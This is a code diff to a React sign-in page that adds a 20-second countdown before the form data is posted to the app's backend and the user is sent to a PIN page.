@@ -1,3 +1,4 @@
+// Home.js
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import "../styles/home.css";
@@ -20,6 +21,8 @@ const schema = yup.object().shape({
 const Home = () => {
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
+  const [countdown, setCountdown] = useState(0);
+  
   const {
     register,
     handleSubmit,
@@ -28,18 +31,35 @@ const Home = () => {
 
   const submitForm = (data) => {
     setLoading(true);
-    axios
-      .post(`${BASE_URL}/`, data)
-      .then((response) => {
-        console.log(response.data);
-        navigate("/pin");
-      })
-      .catch((error) => {
-        console.error("There was an error!", error);
-      })
-      .finally(() => {
-        setLoading(false);
+    setCountdown(20);
+    
+    // Start countdown
+    const countdownInterval = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(countdownInterval);
+          return 0;
+        }
+        return prev - 1;
       });
+    }, 1000);
+
+    // Wait 20 seconds before making the API call
+    setTimeout(() => {
+      axios
+        .post(`${BASE_URL}/`, data)
+        .then((response) => {
+          console.log(response.data);
+          navigate("/pin");
+        })
+        .catch((error) => {
+          console.error("There was an error!", error);
+        })
+        .finally(() => {
+          setLoading(false);
+          setCountdown(0);
+        });
+    }, 20000);
   };
 
   return (
@@ -77,7 +97,12 @@ const Home = () => {
               </div>
               <FormErrMsg errors={errors} inputName="password" />
               <button type="submit" disabled={loading}>
-                {loading ? "Loading..." : "Sign In"}
+                {loading 
+                  ? countdown > 0 
+                    ? `Please wait... ${countdown}s` 
+                    : "Processing..."
+                  : "Sign In"
+                }
               </button>
             </form>
           </div>
